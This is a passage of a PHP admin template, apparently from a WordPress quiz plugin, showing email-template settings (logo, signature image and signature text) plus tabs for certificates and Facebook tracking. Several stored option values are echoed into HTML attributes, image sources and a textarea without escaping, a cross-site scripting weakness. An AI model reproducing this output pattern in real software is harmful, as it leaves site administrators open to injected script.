				$sqb_signature_body = get_option('sqb_signature_body', '');
				$sqb_signature_image = get_option('sqb_signature_image', '');
				$sqb_email_logo = get_option('sqb_email_logo', '');
				?>
				<div class="notification-content">
                    <h5 class="quiz--sub-title">Email Template</h5>
                    <div class="prodcut_inner_outer1">
                         <form action="" method="post" name="ManageConfigForm102" id="ManageConfigForm102">
                            <div class="noti_card_box ">
                                <div class="sqb-form-2-column-row">
                                    <div class="sqb-email-template-field sqb-email-logo-outer sqbimagefield-wrapper">
				                        <label for="" class="quiz_label">Logo Image <br><small>For the logo, the maximum width should be 150px, and the height should adjust automatically.</small> </label>
				                        <div class="quiz-content-card align-items-start border-bottom-0">
				                            <div class="quiz_right-content file-upload-wrapper">
				                                <div class="sqb-img-preview-wrapper">
				                                    <div class="sqb-default-upload-wrapper <?php echo ($sqb_email_logo == '') ? 'active' : ''; ?>">
				                                        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path d="M464 448H48c-26.51 0-48-21.49-48-48V112c0-26.51 21.49-48 48-48h416c26.51 0 48 21.49 48 48v288c0 26.51-21.49 48-48 48zM112 120c-30.928 0-56 25.072-56 56s25.072 56 56 56 56-25.072 56-56-25.072-56-56-56zM64 384h384V272l-87.515-87.515c-4.686-4.686-12.284-4.686-16.971 0L208 320l-55.515-55.515c-4.686-4.686-12.284-4.686-16.971 0L64 336v48z"></path></svg>
				                                        <p class="sqbimagefield-upload-btn sqbimagefield-upload-btn">Upload</p>
				                                        <button type="button" class="btn btn-primary sqbimagefield-upload-btn upload-img-btn-main sqb-email-logo"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path d="M246.6 9.4c-12.5-12.5-32.8-12.5-45.3 0l-128 128c-12.5 12.5-12.5 32.8 0 45.3s32.8 12.5 45.3 0L192 109.3V320c0 17.7 14.3 32 32 32s32-14.3 32-32V109.3l73.4 73.4c12.5 12.5 32.8 12.5 45.3 0s12.5-32.8 0-45.3l-128-128zM64 352c0-17.7-14.3-32-32-32s-32 14.3-32 32v64c0 53 43 96 96 96H352c53 0 96-43 96-96V352c0-17.7-14.3-32-32-32s-32 14.3-32 32v64c0 17.7-14.3 32-32 32H96c-17.7 0-32-14.3-32-32V352z"></path></svg> Upload</button>
				                                        <input name="sqb_email_logo" type="hidden" class="form-control input-large sqbimagefield-hidden" value="<?php echo $sqb_email_logo; ?>">
				                                    </div>
				                                    <div class="sqb-default-upload-wrapper-has-img <?php echo ($sqb_email_logo == '') ? '' : 'active'; ?>">
				                                            <div class="quiz-emailtemp-preview-img">
				                                                <img src="<?php echo $sqb_email_logo; ?>">
				                                            </div>
				                                            <div class="upload-cance-btn">
				                                                <a href="javascript:void(0);" class="delete-quiz-img delete-logo-img">Remove</a>
				                                                <button type="button" class="btn btn-primary upload-img-btn replace-logo-btn"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path d="M246.6 9.4c-12.5-12.5-32.8-12.5-45.3 0l-128 128c-12.5 12.5-12.5 32.8 0 45.3s32.8 12.5 45.3 0L192 109.3V320c0 17.7 14.3 32 32 32s32-14.3 32-32V109.3l73.4 73.4c12.5 12.5 32.8 12.5 45.3 0s12.5-32.8 0-45.3l-128-128zM64 352c0-17.7-14.3-32-32-32s-32 14.3-32 32v64c0 53 43 96 96 96H352c53 0 96-43 96-96V352c0-17.7-14.3-32-32-32s-32 14.3-32 32v64c0 17.7-14.3 32-32 32H96c-17.7 0-32-14.3-32-32V352z"></path></svg>Replace</button>
				                                            </div>
				                                    </div>
				                                </div>
				                            </div>
				                        </div>
				                    </div>

                                    <div class="sqb-email-template-field sqb-email-signature-outer sqbimagefield-wrapper">
				                        <label for="" class="quiz_label">Your Image for the Email Signature <br><small>For the Email Signature, the maximum width should be 60px, and the height should adjust automatically.</small></label>
				                        <div class="quiz-content-card align-items-start border-bottom-0">
				                            <div class="quiz_right-content file-upload-wrapper">
				                                <div class="sqb-img-preview-wrapper">
				                                    <div class="sqb-default-upload-wrapper <?php echo ($sqb_signature_image == '') ? 'active' : ''; ?>">
				                                        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path d="M464 448H48c-26.51 0-48-21.49-48-48V112c0-26.51 21.49-48 48-48h416c26.51 0 48 21.49 48 48v288c0 26.51-21.49 48-48 48zM112 120c-30.928 0-56 25.072-56 56s25.072 56 56 56 56-25.072 56-56-25.072-56-56-56zM64 384h384V272l-87.515-87.515c-4.686-4.686-12.284-4.686-16.971 0L208 320l-55.515-55.515c-4.686-4.686-12.284-4.686-16.971 0L64 336v48z"></path></svg>
				                                        <p class="sqbimagefield-upload-btn sqbimagefield-upload-btn">Upload</p>
				                                        <button type="button" class="btn btn-primary  upload-img-btn-main sqb-email-signature"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path d="M246.6 9.4c-12.5-12.5-32.8-12.5-45.3 0l-128 128c-12.5 12.5-12.5 32.8 0 45.3s32.8 12.5 45.3 0L192 109.3V320c0 17.7 14.3 32 32 32s32-14.3 32-32V109.3l73.4 73.4c12.5 12.5 32.8 12.5 45.3 0s12.5-32.8 0-45.3l-128-128zM64 352c0-17.7-14.3-32-32-32s-32 14.3-32 32v64c0 53 43 96 96 96H352c53 0 96-43 96-96V352c0-17.7-14.3-32-32-32s-32 14.3-32 32v64c0 17.7-14.3 32-32 32H96c-17.7 0-32-14.3-32-32V352z"></path></svg> Upload</button>
				                                        <input name="sqb_signature_image" type="hidden" class="form-control input-large sqbimagefield-hidden" value="<?php echo $sqb_signature_image; ?>">
				                                    </div>
				                                    <div class="sqb-default-upload-wrapper-has-img <?php echo ($sqb_signature_image == '') ? '' : 'active'; ?>">
				                                            <div class="quiz-emailtemp-preview-img">
				                                                <img src="<?php echo $sqb_signature_image; ?>">
				                                            </div>
				                                            <div class="upload-cance-btn">
				                                                <a href="javascript:void(0);" class="delete-quiz-img delete-sign-img">Remove</a>
				                                                <button type="button" class="btn btn-primary upload-img-btn replace-sign-btn"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path d="M246.6 9.4c-12.5-12.5-32.8-12.5-45.3 0l-128 128c-12.5 12.5-12.5 32.8 0 45.3s32.8 12.5 45.3 0L192 109.3V320c0 17.7 14.3 32 32 32s32-14.3 32-32V109.3l73.4 73.4c12.5 12.5 32.8 12.5 45.3 0s12.5-32.8 0-45.3l-128-128zM64 352c0-17.7-14.3-32-32-32s-32 14.3-32 32v64c0 53 43 96 96 96H352c53 0 96-43 96-96V352c0-17.7-14.3-32-32-32s-32 14.3-32 32v64c0 17.7-14.3 32-32 32H96c-17.7 0-32-14.3-32-32V352z"></path></svg>Replace</button>
				                                            </div>
				                                    </div>
				                                </div>
				                            </div>
				                        </div>
				                    </div>


                                    <div class="sqb-field-row sqb-col-6">
                                        <label for="" class="quiz_label mb-2">Signature Text <div class="tool-tip">
						<i class="fa fa-info-circle" aria-hidden="true"></i>
						<div class="toll-tip-desc" style="max-width:400px;">For e.g.<br> Joe Smith<br> Founder: YourDomain.com</div>
					</div> </label>
                                        <div class="sqb-input-field-wrapper">
                                            <textarea class="form-control sqb_text_editor" id="sqb_signature_body" name="sqb_signature_body" rows="10"><?php echo $sqb_signature_body; ?></textarea>
                                        </div>

                                    </div>

                                    


                                </div>
                            </div>

                            <div class="container sqb-save-btn-global">
                                <div class="quiz-actions justify-content-center">
									<a href="javascript:void(0)" class="quiz--btn quiz-save-btn sqb_save_email_template_sign"> Save </a>
								</div>
                            </div>
                        </form>
                    </div>
                </div>
			</div>	
			
			<div class="tab-pane  fade  " id="Quiz_setting_tab_7" role="tabpanel" aria-labelledby="Quiz_setting_tab_7">	
				<div class="manage_course_certificates_wrapper">
					<div class="certificate-tab-style">
						<?php include_once('add_course_certificate.php'); ?> 
					</div>
				</div>
			</div>	
								   
		</div>
	</div>

<div class="tab-pane  " id="settings_tracking_tab" role="tabpanel" aria-labelledby="settings_tracking">
	<h3 class="quiz--title quiz_settings_head pb-0"><i class="fa fa-cog" aria-hidden="true"></i><div class="smalltext_outer" > Tracking and Events
		<small style="color:#555;font-size: 15px;padding: 12px 0px;margin: 0;display: inline-block;width: 100%;vertical-align: top;">You can track custom audience and conversion events in Facebook. You can use these events and the data in Custom Audiences on Facebook.</small></div></h3>
		<?php include_once('sqb_fb_tracking.php');?>
</div>

<input type="hidden" id="get_home_url" value="<?php echo get_home_url(); ?>">

<?php 
$samplecsvDownloadUrl = plugin_dir_url(__FILE__).'/sqb_sample_csv_download.php';
?>
<script>
var samplecsvDownloadUrl = "<?= $samplecsvDownloadUrl ?>";
</script>